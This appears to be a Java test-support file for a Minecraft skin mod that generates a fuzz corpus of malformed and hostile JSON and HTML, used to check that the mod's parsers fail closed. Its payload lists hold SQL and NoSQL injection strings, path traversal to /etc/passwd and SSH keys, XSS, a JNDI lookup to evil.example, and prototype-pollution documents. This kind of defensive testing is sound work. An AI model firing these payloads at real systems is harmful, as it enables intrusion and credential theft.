/*
 * SPDX-License-Identifier: MIT
 * Copyright (c) 2025 Levosilimo
 * https://github.com/Levosilimo/Everlasting-Skins
 */

package levosilimo.everlastingskins.skinchanger;

import com.google.gson.Gson;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import com.google.gson.JsonParseException;
import com.google.gson.JsonSyntaxException;
import levosilimo.everlastingskins.enums.SkinVariant;
import net.jqwik.api.Arbitraries;
import net.jqwik.api.Arbitrary;
import net.jqwik.api.Combinators;
import net.jqwik.api.Tuple;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

/**
 * Shared jqwik generators for the AI-generated parser fuzz corpus.
 * <p>
 * Motivation (Pearce et al., S&P 2022): ~40% of Copilot-generated programs
 * in 89 security scenarios contain vulnerabilities (CWE-79 XSS, CWE-787 OOB
 * write, CWE-330 insufficient randomness). The mod's HTTP/JSON parsers
 * (MojangApiHttpImpl, MineSkinApiHttpImpl, JsonUtils, RandomMojangSkin) are
 * exactly this surface, so every generator here produces "malformed JSON
 * byte shapes" that those parsers must fail closed on: default behavior is
 * "no result", never an exception escape.
 * <p>
 * Corpus contract (what the properties are allowed to feed the parsers):
 * <ul>
 *   <li>Every input is either malformed JSON (Gson raises JsonSyntaxException,
 *       which {@code HttpResponse.getBodyAs} swallows) or valid JSON with an
 *       <b>object</b> root whose hostile content stays inert data.</li>
 *   <li>Valid non-object roots ({@code [1,2]}, {@code 1}, {@code "x"},
 *       {@code null}, {@code NaN} as a whole document) are excluded: they make
 *       {@code JsonObject#getAsJsonObject} throw {@code IllegalStateException},
 *       a fail-open escape in the MineSkin v2/rate-limit paths that is a
 *       documented production finding, not a malformed-bytes shape. The
 *       {@link #malformedJson()} mix re-filters every candidate as a safety
 *       net.</li>
 *   <li>No input parses to a complete result: hostile values only land in
 *       scalar fields, never as a valid 32-hex UUID or a complete textures
 *       property, so the {@code returnsEmpty} properties assert a real
 *       fail-closed contract instead of semantic base64 validation.</li>
 *   <li>Deep nesting is object-rooted: Gson 2.10.1 parses nesting
 *       iteratively (probed to 100k depth on a 1 MB stack), so "excess
 *       nesting that overflows Gson stack limits" is exercised as hostile
 *       input without depending on the test thread's stack size.</li>
 * </ul>
 * Test-support only: this file is never shipped.
 */
public final class MalformedJsonCorpus {

    private MalformedJsonCorpus() {
    }

    private static final Gson GSON = new Gson();
    private static final JsonParser PARSE_FILTER = new JsonParser();

    /** The exact marker {@link RandomMojangSkin} scans for. */
    private static final String SPAN_OPENER = "<span class=\"card-title green-text truncate\">";

    /* ================================================================== */
    /*  Hostile literal pools (SQLi, NoSQLi, traversal, XSS, templates)    */
    /* ================================================================== */

    /** Injection payloads; every string value in the hostile docs comes from here. */
    public static final List<String> HOSTILE_LITERALS = Arrays.asList(
            // SQL injection (CWE-89)
            "' OR 1=1 --",
            "'; DROP TABLE skins;--",
            "\" OR \"\"=\"\"",
            "' UNION SELECT username,password FROM users--",
            "1' AND '1'='1",
            "'; WAITFOR DELAY '0:0:5';--",
            "' OR 'a'='a",
            "x' OR 1=1 #",
            "' OR 1=1 /*",
            "%' OR '1'='1",
            // NoSQL operator injection
            "$where",
            "this.password == ''",
            "$ne",
            "$gt",
            "$regex",
            "$or",
            "sleep(5000)",
            // path traversal (CWE-22)
            "../../etc/passwd",
            "..\\..\\windows\\system32\\cmd.exe",
            "/etc/passwd",
            "~/.ssh/id_rsa",
            "..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "http://evil.example/../../s",
            "\u0000",
            "/proc/self/environ",
            "..;/..;/etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            // XSS (CWE-79) and template injection
            "<script>alert(1)</script>",
            "javascript:alert(document.cookie)",
            "${jndi:ldap://evil.example/a}",
            "{{7*7}}",
            "{{constructor.constructor('return process')().env.HOME}}"
    );

    /** Path-traversal subset reused by the HTML corpus. */
    public static final List<String> TRAVERSAL_LITERALS = Arrays.asList(
            "../../etc/passwd",
            "..\\..\\windows\\system32\\cmd.exe",
            "/etc/passwd",
            "~/.ssh/id_rsa",
            "..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "http://evil.example/../../s",
            "\u0000",
            "/proc/self/environ",
            "..;/..;/etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    );

    /** Prototype-pollution-shaped documents; all string values come from {@link #HOSTILE_LITERALS}. */
    private static final String[] PP_DOCS = {
            "{\"__proto__\":{\"polluted\":\"' OR 1=1 --\"}}",
            "{\"__proto__\":{\"__proto__\":{\"x\":\"../../etc/passwd\"}}}",
            "{\"constructor\":{\"prototype\":{\"x\":\"' OR 1=1 --\"}}}",
            "{\"prototype\":{\"__proto__\":\"~/.ssh/id_rsa\"}}",
            "{\"hasOwnProperty\":\"javascript:alert(document.cookie)\"}",
            "{\"__defineGetter__\":\"../../etc/passwd\"}",
            "{\"a\":{\"__proto__\":{\"b\":\"' OR 1=1 --\"}}}",
            "{\"__proto__\":\"../../etc/passwd\",\"constructor\":{\"prototype\":{\"x\":1}}}"
    };

    /** Rate-limit-shaped bodies that must resolve to a zero wait (no sleep, no delay metric). */
    private static final String[] RATE_LIMIT_DOCS = {
            "{\"error\":\"' OR 1=1 --\",\"delay\":-1}",
            "{\"error\":\"../../etc/passwd\",\"delay\":0}",
            "{\"nextRequest\":-1,\"delay\":-100}",
            "{\"delay\":\"-5\"}",
            "{\"rateLimit\":{\"next\":{\"relative\":-100}}}",
            "{\"rateLimit\":{\"next\":{\"relative\":0}}}",
            "{\"rateLimit\":{\"next\":{\"relative\":-1,\"absolute\":1}}}",
            "{\"rateLimit\":{\"next\":{\"absolute\":1}}}",
            "{\"rateLimit\":{\"next\":{\"relative\":\"-5\"}}}",
            "{\"rateLimit\":{\"next\":{\"relative\":-0.5}}}",
            "{\"rateLimit\":{\"next\":{\"relative\":-1,\"__proto__\":{\"payload\":\"' OR 1=1 --\"}}}}",
            "{\"rateLimit\":{\"__proto__\":{\"next\":{\"relative\":-1}}}}",
            "{\"error\":{\"$where\":\"this.x==1\"},\"delay\":-1}",
            "{\"error\":\"x' OR '1'='1\",\"nextRequest\":-999999}",
            "{\"rateLimit\":{\"next\":{}}}",
            "{\"rateLimit\":{}}"
    };

    /* ================================================================== */
    /*  Universal malformed-JSON mix                                      */
    /* ================================================================== */

    /**
     * The corpus every "malformed bytes" property draws from: empty and
     * whitespace-only inputs, truncated documents, mismatched brackets,
     * excess object nesting, invalid escapes, invalid numbers, invalid
     * unicode, oversized documents, and hostile (SQLi/NoSQL/traversal/
     * prototype-pollution) payloads. Every candidate is re-filtered so a
     * valid non-object root can never reach a parser.
     */
    public static Arbitrary<String> malformedJson() {
        return Arbitraries.frequencyOf(
                Tuple.of(4, emptyOrWhitespace()),
                Tuple.of(15, truncated()),
                Tuple.of(15, mismatched()),
                Tuple.of(12, deepNesting()),
                Tuple.of(10, invalidEscapes()),
                Tuple.of(10, invalidNumbers()),
                Tuple.of(10, invalidUnicode()),
                Tuple.of(4, oversized()),
                Tuple.of(20, hostileValues())
        ).filter(MalformedJsonCorpus::parsesToObjectOrMalformed);
    }

    /** MineSkin v2-shape failures: truncated v2 documents plus the universal mix. */
    public static Arbitrary<String> v2Malformed() {
        return Arbitraries.frequencyOf(
                Tuple.of(15, malformedJson()),
                Tuple.of(10, v2Truncated()),
                Tuple.of(10, v2Corrupted())
        ).filter(MalformedJsonCorpus::parsesToObjectOrMalformed);
    }

    /** MineSkin rate-limit bodies that must fail closed to a zero wait. */
    public static Arbitrary<String> rateLimitMalformed() {
        return Arbitraries.frequencyOf(
                Tuple.of(70, malformedJson()),
                Tuple.of(30, Arbitraries.of(RATE_LIMIT_DOCS))
        ).filter(MalformedJsonCorpus::parsesToObjectOrMalformed);
    }

    /** Valid JSON with hostile string values; used by the injection-inertness property. */
    public static Arbitrary<String> hostileValues() {
        return Arbitraries.oneOf(
                Arbitraries.of(HOSTILE_LITERALS.toArray(new String[0]))
                        .map(MalformedJsonCorpus::hostileTemplate),
                Arbitraries.of(PP_DOCS)
        );
    }

    /* ================================================================== */
    /*  JSON categories                                                   */
    /* ================================================================== */

    public static Arbitrary<String> emptyOrWhitespace() {
        return Arbitraries.of("", " ", "\t", "\n", " \t\n  ", "\u00A0", "\r\n");
    }

    public static Arbitrary<String> truncated() {
        String[] validDocs = {
                "{\"name\":\"TestPlayer\",\"id\":\"12345678123412341234123456789abc\"}",
                "{\"properties\":[{\"name\":\"textures\",\"value\":\"v\",\"signature\":\"s\"}]}",
                "{\"data\":{\"texture\":{\"value\":\"v\",\"signature\":\"s\"}},\"id\":1,\"idStr\":\"1\",\"variant\":\"slim\"}",
                "{\"skin\":{\"texture\":{\"data\":{\"value\":\"v\",\"signature\":\"s\"}},\"uuid\":\"u\",\"variant\":\"slim\"}}",
                "{\"error\":\"e\",\"delay\":5}",
                "{\"rateLimit\":{\"next\":{\"relative\":1000}}}",
                "{\"raw\":{\"id\":\"x\",\"name\":\"y\",\"status\":\"OK\",\"properties\":[{\"name\":\"textures\",\"value\":\"v\",\"signature\":\"s\"}]}}"
        };
        return Arbitraries.oneOf(
                Arbitraries.of(validDocs).flatMap(doc ->
                        Arbitraries.integers().between(0, doc.length() - 1).map(i -> doc.substring(0, i))),
                Arbitraries.of("{", "[", "\"foo", "{ \"k\":", "{\"a\":", "[1,2,",
                        "{\"a\":[", "{\"a\":{\"b\":", "{\"a\":1,", "[\"a\",")
        );
    }

    public static Arbitrary<String> mismatched() {
        return Arbitraries.oneOf(
                Arbitraries.of("{ ]", "[ }", "{ \"k\": ]", "[1, 2}", "{\"a\": ]", "]", "}",
                        "{ [ } ]", "{\"a\":\"b\" ]", "[{\"a\":1}] }", "[1 2]", "{\"a\" \"b\"}",
                        "{\"a\":[}", "{\"a\":{\"b\":}}"),
                Arbitraries.strings()
                        .withChars('[', ']', '{', '}', '"', ':', ',', '1', '2', ' ', 'a', 'n', 'u', 'l', 't', 'r', 'e', '0')
                        .ofMinLength(1).ofMaxLength(48)
                        .filter(MalformedJsonCorpus::parsesToObjectOrMalformed)
        );
    }

    /**
     * Excess nesting: object-rooted documents 50 to 3000 levels deep (arrays
     * and objects). Gson 2.10.1 walks nesting iteratively, so these parse
     * successfully and must resolve to "no result" rather than a crash.
     */
    public static Arbitrary<String> deepNesting() {
        return Arbitraries.integers().between(50, 3000).map(MalformedJsonCorpus::deepNestedDoc);
    }

    public static Arbitrary<String> invalidEscapes() {
        return Arbitraries.of(
                "{\"k\":\"\\u\"}", "{\"k\":\"\\<\"}", "{\"k\":\"\\x\"}", "{\"k\":\"abc\\",
                "{\"k\":\"\\u12\"}", "{\"k\":\"\\uZZZZ\"}", "{\"k\":\"abc", "{\"k\":\"\\uD800\"}",
                "{\"k\":\"\\uDC00\"}", "{\"k\":\"\\ud800\\ud800\"}", "{\"k\":\"\\q\"}",
                "{\"k\":\"\\u12\\u\"}", "{\"k\":\"a\\\\\"}", "{\"k\":\"\\b\\f\\r\\t\"}"
        );
    }

    public static Arbitrary<String> invalidNumbers() {
        return Arbitraries.of(
                "{\"n\":NaN}", "{\"n\":Infinity}", "{\"n\":-Infinity}", "{\"n\":+1}", "{\"n\":01}",
                "{\"n\":0x1}", "{\"n\":1.}", "{\"n\":.5}", "{\"n\":1e}", "{\"n\":--1}", "{\"n\":1e999}",
                "{\"n\":9223372036854775808}", "{\"n\":-0}", "{\"n\":1_000}", "{\"n\":1e+}", "{\"n\":.}",
                "{\"n\":1..2}", "{\"n\":0.0.0}", "{\"n\":12e}", "{\"id\":123456789012345678901234567890}"
        );
    }

    public static Arbitrary<String> invalidUnicode() {
        return Arbitraries.oneOf(
                Arbitraries.of(
                        "{\"k\":\"\\uD800\"}", "{\"k\":\"\\uDC00\"}", "{\"k\":\"\\udfff\"}",
                        "{\"k\":\"\\uD800\\uDC00\"}", "{\"k\":\"\\u0000\"}", "{\"k\":\"\\u0001\"}",
                        "{\"k\":\"\\uD800x\"}"),
                Arbitraries.of(rawLoneSurrogate(), rawControlChar(), rawMalformedUtf8(),
                        overlongUtf8(), rawNullByte(), rawLatin1Bytes())
        );
    }

    /** Oversized documents: &gt;1 MB strings, huge keys, huge arrays, huge whitespace, 10k-key objects. */
    public static Arbitrary<String> oversized() {
        return Arbitraries.integers().between(0, 6).map(MalformedJsonCorpus::oversizedDoc);
    }

    /* ================================================================== */
    /*  HTML categories (RandomMojangSkin.extractUsernames)               */
    /* ================================================================== */

    /**
     * Malformed HTML that must extract nothing: random garbage, truncated
     * copies of the span opener, and at most one complete opener never
     * followed by a {@code <} (the parser bails out on both shapes).
     */
    public static Arbitrary<String> malformedHtml() {
        Arbitrary<String> garbage = Arbitraries.strings()
                .withChars('<', '>', '"', '\'', 's', 'p', 'a', 'n', 'c', 'l', 'r', 'd', 't', 'e',
                        'g', 'i', 'u', ' ', '=', '/', '\\', '\n', '\t', '0', '1', '2', '.', '-', '_')
                .ofMinLength(0).ofMaxLength(128);
        Arbitrary<String> openerFree = garbage.filter(s -> s.indexOf(SPAN_OPENER) == -1);
        Arbitrary<String> truncatedOpener = Arbitraries.integers().between(1, SPAN_OPENER.length() - 1)
                .map(i -> SPAN_OPENER.substring(0, i));
        Arbitrary<String> noLtSuffix = Arbitraries.strings()
                .withChars('a', 'b', ' ', '9', '.', '/', '\\', '\n')
                .ofMinLength(0).ofMaxLength(64);
        Arbitrary<String> singleOpenerNoClose = Combinators.combine(openerFree, noLtSuffix)
                .as((pre, suf) -> pre + SPAN_OPENER + suf);
        return Arbitraries.oneOf(openerFree, truncatedOpener, singleOpenerNoClose);
    }

    /** Oversized HTML: many spans, a 1-64 KB username, up to 1 MB of noise, 100+ dangling openers. */
    public static Arbitrary<String> oversizedHtml() {
        Arbitrary<String> manySpans = Arbitraries.integers().between(100, 5000).map(n -> {
            StringBuilder sb = new StringBuilder(n * 64);
            for (int i = 0; i < n; i++) {
                sb.append(SPAN_OPENER).append("User").append(i).append("</span>\n");
            }
            return sb.toString();
        });
        Arbitrary<String> longUsername = Arbitraries.integers().between(1024, 65536)
                .map(n -> SPAN_OPENER + repeat('a', n) + "<");
        Arbitrary<String> bigNoise = Arbitraries.integers().between(65536, 1048576)
                .map(MalformedJsonCorpus::noiseHtml);
        Arbitrary<String> manyOpeners = Arbitraries.integers().between(100, 10000)
                .map(n -> repeat(SPAN_OPENER, n));
        return Arbitraries.oneOf(manySpans, longUsername, bigNoise, manyOpeners);
    }

    /** Complete spans whose content is a path-traversal payload; nothing may be decoded. */
    public static Arbitrary<String> traversalHtml() {
        return Arbitraries.of(TRAVERSAL_LITERALS.toArray(new String[0]))
                .map(lit -> "\n" + SPAN_OPENER + lit + "</span>\n" + SPAN_OPENER + lit + lit + "</span>");
    }

    /* ================================================================== */
    /*  Arbitrary object graphs for toJson                                */
    /* ================================================================== */

    /** Acyclic arbitrary values (scalars, lists, maps, POJOs, enums, UUIDs, byte arrays). */
    public static Arbitrary<Object> arbitraryValues() {
        Arbitrary<Object> leaf = Arbitraries.oneOf(
                Arbitraries.just(null),
                Arbitraries.of(true, false),
                Arbitraries.integers().between(-100000, 100000),
                Arbitraries.longs().between(-1000000000000L, 1000000000000L),
                Arbitraries.doubles().between(-1e6, 1e6),
                Arbitraries.strings().withCharRange('a', 'z').ofMinLength(0).ofMaxLength(64),
                Arbitraries.longs().map(l -> new UUID(l, l ^ 0x123456789ABCDEFL)),
                Arbitraries.of(SkinVariant.CLASSIC, SkinVariant.SLIM),
                Arbitraries.strings().ofMaxLength(32).map(s -> s.getBytes(StandardCharsets.UTF_8)),
                Arbitraries.of(new FuzzPojo("alpha", 1), new FuzzPojo("beta", null), new FuzzPojo("", -7))
        );
        return Arbitraries.recursive(() -> leaf, MalformedJsonCorpus::nestedValue, 3);
    }

    /** Simple serializable POJO for the toJson property. */
    public static final class FuzzPojo {
        public final String name;
        public final Integer count;

        public FuzzPojo(String name, Integer count) {
            this.name = name;
            this.count = count;
        }
    }

    /* ================================================================== */
    /*  Helpers                                                           */
    /* ================================================================== */

    private static Arbitrary<Object> nestedValue(Arbitrary<Object> nested) {
        return Arbitraries.oneOf(
                nested.list().ofMinSize(0).ofMaxSize(4),
                Arbitraries.maps(
                        Arbitraries.strings().withCharRange('a', 'z').ofMinLength(0).ofMaxLength(8),
                        nested
                ).ofMaxSize(4)
        );
    }

    /** Valid JSON whose hostile strings land only in inert scalar fields. */
    private static String hostileTemplate(String literal) {
        Map<String, Object> doc = new LinkedHashMap<String, Object>();
        doc.put("name", literal);
        doc.put("id", literal);
        doc.put("properties", new ArrayList<Object>());
        doc.put("$where", literal);
        Map<String, Object> proto = new LinkedHashMap<String, Object>();
        proto.put("payload", literal);
        doc.put("__proto__", proto);
        Map<String, Object> ctor = new LinkedHashMap<String, Object>();
        Map<String, Object> ctorProto = new LinkedHashMap<String, Object>();
        ctorProto.put("x", literal);
        ctor.put("prototype", ctorProto);
        doc.put("constructor", ctor);
        return GSON.toJson(doc);
    }

    private static String deepNestedDoc(int depth) {
        boolean objects = depth % 2 == 0;
        StringBuilder sb = new StringBuilder(depth * 4 + 16);
        if (objects) {
            for (int i = 0; i < depth; i++) {
                sb.append("{\"a\":");
            }
            sb.append("\"v\"");
            for (int i = 0; i < depth; i++) {
                sb.append('}');
            }
        } else {
            sb.append("{\"a\":");
            for (int i = 0; i < depth; i++) {
                sb.append('[');
            }
            sb.append('1');
            for (int i = 0; i < depth; i++) {
                sb.append(']');
            }
            sb.append('}');
        }
        return sb.toString();
    }

    private static String oversizedDoc(int sel) {
        switch (sel) {
            case 0:
                return "{\"k\":\"" + repeat('a', 1_100_000) + "\"}";
            case 1:
                return "{\"" + repeat('k', 100_000) + "\":\"v\"}";
            case 2:
                StringBuilder arr = new StringBuilder("{\"a\":[");
                for (int i = 0; i < 50_000; i++) {
                    arr.append("1,");
                }
                arr.append("1]}");
                return arr.toString();
            case 3:
                return deepNestedDoc(3000);
            case 4:
                return repeat(' ', 200_000) + "{}";
            case 5:
                StringBuilder many = new StringBuilder("{");
                for (int i = 0; i < 10_000; i++) {
                    if (i > 0) {
                        many.append(',');
                    }
                    many.append("\"a").append(i).append("\":").append(i);
                }
                many.append('}');
                return many.toString();
            default:
                return "{\"k\":\"" + repeat("\\u0041", 100_000) + "\"}";
        }
    }

    private static final String V2_DOC = "{\"skin\":{\"texture\":{\"data\":{\"value\":\"v\",\"signature\":\"s\"}},\"uuid\":\"u\",\"variant\":\"slim\"}}";

    private static Arbitrary<String> v2Truncated() {
        return Arbitraries.integers().between(0, V2_DOC.length() - 1).map(i -> V2_DOC.substring(0, i));
    }

    /** V2-shape failures whose value slot is empty/absent/null; hostile strings stay in inert fields. */
    private static Arbitrary<String> v2Corrupted() {
        return Arbitraries.of(
                "{\"skin\":{\"texture\":{\"data\":{\"value\":\"\"}}}}",
                "{\"skin\":{\"texture\":{\"data\":{\"value\":null}}}}",
                "{\"skin\":{\"texture\":{\"data\":{}}}}",
                "{\"skin\":{\"texture\":{}}}",
                "{\"skin\":{}}",
                "{\"skin\":{\"texture\":[]}}",
                "{\"skin\":{\"texture\":{\"data\":{\"value\":\"\",\"signature\":\"' OR 1=1 --\"}},\"uuid\":\"../../etc/passwd\",\"variant\":\"slim\"}}",
                "{\"skin\":{\"uuid\":\"' OR 1=1 --\",\"variant\":\"slim\",\"texture\":{\"data\":{\"value\":\"\"}}}}",
                "{\"skin\":{\"texture\":{\"data\":{\"value\":\"\"}},\"uuid\":\"..%2F..%2Fetc%2Fpasswd\",\"variant\":\"x\"}}"
        );
    }

    private static String rawLoneSurrogate() {
        return "{\"k\":\"" + '\uD800' + "\"}";
    }

    private static String rawControlChar() {
        return "{\"k\":\"" + '\u0001' + "\"}";
    }

    private static String rawNullByte() {
        return "{\"k\":\"" + '\u0000' + "\"}";
    }

    private static String rawMalformedUtf8() {
        String s = new String(new byte[]{(byte) 0xC3, (byte) 0x28}, StandardCharsets.UTF_8);
        return "{\"k\":\"" + s + "\"}";
    }

    private static String overlongUtf8() {
        String s = new String(new byte[]{(byte) 0xC0, (byte) 0xAF}, StandardCharsets.UTF_8);
        return "{\"k\":\"" + s + "\"}";
    }

    private static String rawLatin1Bytes() {
        String s = new String(new byte[]{(byte) 0x80, (byte) 0x9F, (byte) 0xFF},
                java.nio.charset.Charset.forName("ISO-8859-1"));
        return "{\"k\":\"" + s + "\"}";
    }

    private static String noiseHtml(int len) {
        StringBuilder sb = new StringBuilder(len);
        for (int i = 0; i < len; i++) {
            sb.append((char) ('a' + (i * 31) % 26));
        }
        return sb.toString();
    }

    private static String repeat(char c, int n) {
        StringBuilder sb = new StringBuilder(n);
        for (int i = 0; i < n; i++) {
            sb.append(c);
        }
        return sb.toString();
    }

    private static String repeat(String s, int n) {
        StringBuilder sb = new StringBuilder(s.length() * n);
        for (int i = 0; i < n; i++) {
            sb.append(s);
        }
        return sb.toString();
    }

    /**
     * Safety net: a candidate is corpus-safe when it fails closed under
     * <b>both</b> Gson entry points — the lenient {@link JsonParser} (used by
     * {@code JsonUtils.parseJson} and the MineSkin v2/rate-limit paths) and
     * the strict {@code Gson#fromJson} (used by {@code HttpResponse.getBodyAs}):
     * either it is malformed JSON (JsonSyntaxException on both paths) or it
     * parses to an object-shaped document (hostile content stays inert data).
     * <p>
     * Documented exclusion (production finding, test-only PR): truncated
     * {@code \u005CuXXXX} escapes (e.g. {@code {"k":"\u005Cu12"}}) make the strict
     * {@code fromJson} throw a raw {@code NumberFormatException} instead of
     * {@code JsonSyntaxException} — Gson 2.10.1 {@code JsonReader} gap — so
     * {@code HttpResponse.getBodyAs} lets it escape. Such candidates are
     * rejected here; the Mojang/MineSkin parsers need a follow-up fix round.
     */
    private static boolean parsesToObjectOrMalformed(String s) {
        try {
            JsonElement root = PARSE_FILTER.parse(s);
            if (!root.isJsonObject()) {
                return false;
            }
        } catch (JsonParseException e) {
            // malformed under the lenient parser; strict path decides below
        }
        try {
            Object strict = GSON.fromJson(s, Object.class);
            return strict instanceof java.util.Map;
        } catch (JsonSyntaxException e) {
            return true; // malformed under the strict path too — fails closed everywhere
        } catch (RuntimeException e) {
            return false; // strict path fails open (raw NFE etc.) — not corpus-safe
        }
    }
}
